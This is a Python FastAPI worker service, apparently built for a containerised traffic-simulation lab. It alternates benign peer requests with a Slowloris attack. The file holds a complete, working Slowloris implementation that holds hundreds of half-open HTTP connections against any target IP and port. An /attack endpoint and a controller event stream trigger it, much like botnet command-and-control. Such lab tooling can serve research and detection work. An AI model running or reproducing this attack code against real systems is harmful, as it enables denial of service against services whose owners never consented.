"""
Traffic simulation worker.
Slowloris attack logic adapted from https://github.com/gkbrk/slowloris (MIT License)
"""
import asyncio
import json
import os
import random
import socket
import sys

import httpx
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

app = FastAPI(title="Traffic Worker")

CONTROLLER_URL = os.getenv("CONTROLLER_URL", "http://controller:8000")
PORT = 8001

_task: asyncio.Task | None = None
_stop_event = asyncio.Event()
_state: str = "idle"  # idle, normal, attacking
_peers: list[str] = []


async def normal_traffic(peers: list[str], target_port: int, rps: float):
    delay = 1.0 / rps
    async with httpx.AsyncClient(timeout=2) as client:
        while not _stop_event.is_set():
            if peers:
                target = random.choice(peers)
                try:
                    await client.get(f"http://{target}:{target_port}/")
                except Exception:
                    pass
            jitter = random.uniform(-delay * 0.3, delay * 0.3)
            await asyncio.sleep(max(0.01, delay + jitter))


def _init_slowloris_socket(target_ip: str, target_port: int) -> socket.socket | None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target_ip}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0\r\n")
        s.send(b"Accept-language: en-US,en,q=0.5\r\n")
        return s
    except socket.error:
        return None


async def slowloris(target_ip: str, target_port: int, num_sockets: int):
    sockets: list[socket.socket] = []

    for _ in range(num_sockets):
        if _stop_event.is_set():
            break
        s = await asyncio.get_event_loop().run_in_executor(
            None, _init_slowloris_socket, target_ip, target_port
        )
        if s:
            sockets.append(s)

    while not _stop_event.is_set():
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except socket.error:
                sockets.remove(s)

        needed = num_sockets - len(sockets)
        if needed > 0 and not _stop_event.is_set():
            new_sockets = await asyncio.gather(*[
                asyncio.get_event_loop().run_in_executor(
                    None, _init_slowloris_socket, target_ip, target_port
                )
                for _ in range(needed)
            ])
            sockets.extend(s for s in new_sockets if s)

        await asyncio.sleep(1)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass


async def _stop_current():
    global _task
    _stop_event.set()
    if _task and not _task.done():
        _task.cancel()
        try:
            await _task
        except asyncio.CancelledError:
            pass
    _stop_event.clear()
    _task = None


async def _handle_command(data: dict):
    global _task, _state, _peers
    cmd = data.get("cmd")
    my_ip = socket.gethostbyname(socket.gethostname())

    if cmd == "attack":
        _state = "attacking"
        await _stop_current()
        _task = asyncio.create_task(
            slowloris(data["target_ip"], data["target_port"], data["num_sockets"])
        )
        print(f"[cmd] attacking {data['target_ip']}", flush=True)

    elif cmd == "normal":
        _state = "normal"
        _peers = [p for p in data.get("peers", []) if p != my_ip]
        await _stop_current()
        if _peers:
            _task = asyncio.create_task(normal_traffic(_peers, PORT, 1.0))
        print(f"[cmd] normal traffic, peers: {_peers}", flush=True)

    elif cmd == "peers":
        # Only update peers — don't interrupt an ongoing attack
        _peers = [p for p in data.get("peers", []) if p != my_ip]
        if _state == "normal":
            await _stop_current()
            if _peers:
                _task = asyncio.create_task(normal_traffic(_peers, PORT, 1.0))
        print(f"[cmd] peers updated: {_peers}", flush=True)

    elif cmd == "stop":
        _state = "idle"
        await _stop_current()
        print("[cmd] stopped", flush=True)


async def _controller_listener():
    my_ip = socket.gethostbyname(socket.gethostname())
    while True:
        try:
            async with httpx.AsyncClient(timeout=None) as client:
                async with client.stream(
                    "GET", f"{CONTROLLER_URL}/stream",
                    params={"node_ip": my_ip},
                    headers={"Accept": "text/event-stream"},
                ) as resp:
                    print(f"[+] Connected to controller stream as {my_ip}", flush=True)
                    async for line in resp.aiter_lines():
                        if line.startswith("data: "):
                            try:
                                data = json.loads(line[6:])
                                await _handle_command(data)
                            except Exception as e:
                                print(f"[!] Command error: {e}", flush=True)
        except Exception as e:
            print(f"[-] Controller stream lost: {e}, reconnecting in 3s", flush=True)
            await asyncio.sleep(3)


# --- HTTP endpoints (kept for manual control) ---

class AttackRequest(BaseModel):
    target_ip: str
    target_port: int = 8001
    num_sockets: int = 200


class NormalRequest(BaseModel):
    peers: list[str]
    target_port: int = 8001
    rps: float = 1.0


@app.post("/attack")
async def attack(req: AttackRequest):
    global _task
    await _stop_current()
    _task = asyncio.create_task(
        slowloris(req.target_ip, req.target_port, req.num_sockets)
    )
    return {"status": "attacking", "target": req.target_ip}


@app.post("/normal")
async def normal(req: NormalRequest):
    global _task
    my_ip = socket.gethostbyname(socket.gethostname())
    peers = [p for p in req.peers if p != my_ip]
    await _stop_current()
    _task = asyncio.create_task(normal_traffic(peers, req.target_port, req.rps))
    return {"status": "normal", "peers": peers}


@app.post("/stop")
async def stop():
    await _stop_current()
    return {"status": "stopped"}


@app.get("/status")
async def status():
    return {"active": _task is not None and not _task.done()}


@app.get("/")
@app.get("/page")
async def page():
    return HTMLResponse("""
    <html><head><title>Worker Node</title>
    <style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f0f4f8;}
    .card{background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center;}
    h1{color:#2d3748;} p{color:#718096;}</style></head>
    <body><div class="card"><h1>Worker Node</h1><p>This service is running normally.</p></div></body></html>
    """)


def _handle_exception(loop, context):
    exc = context.get("exception")
    if isinstance(exc, OSError) and exc.errno == 24:
        print("[victim] Too many open files — exiting for Docker restart", flush=True)
        import time; time.sleep(5)
        sys.exit(1)
    loop.default_exception_handler(context)


@app.on_event("startup")
async def startup():
    asyncio.get_event_loop().set_exception_handler(_handle_exception)
    asyncio.create_task(_controller_listener())
